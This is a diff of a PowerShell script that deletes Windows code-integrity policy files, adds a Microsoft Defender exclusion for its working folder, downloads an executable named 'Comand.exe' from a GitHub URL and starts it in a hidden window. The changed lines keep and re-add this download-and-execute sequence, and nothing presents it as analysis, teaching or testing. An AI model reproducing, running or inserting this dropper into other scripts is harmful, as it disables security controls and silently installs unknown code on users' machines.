@@ -37,10 +37,12 @@ try {
     Remove-Item -LiteralPath "$env:windir\Boot\EFI\wisipolicy.p7b" -ErrorAction SilentlyContinue
     Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse -ErrorAction SilentlyContinue
 
-    $path = Get-Item $env:TEMP
-    $folder = $path.FullName
-    Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue
+$path = Get-Location
+$folder = $path.Path
 
-    Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$folder\Comand.exe" -ErrorAction SilentlyContinue
-    Start-Process -FilePath "$folder\Comand.exe" -WindowStyle Hidden
+try {
+    Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
 } catch {}
+
+Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$folder\Comand.exe" -ErrorAction SilentlyContinue
+Start-Process -FilePath "$folder\Comand.exe" -WindowStyle Hidden   
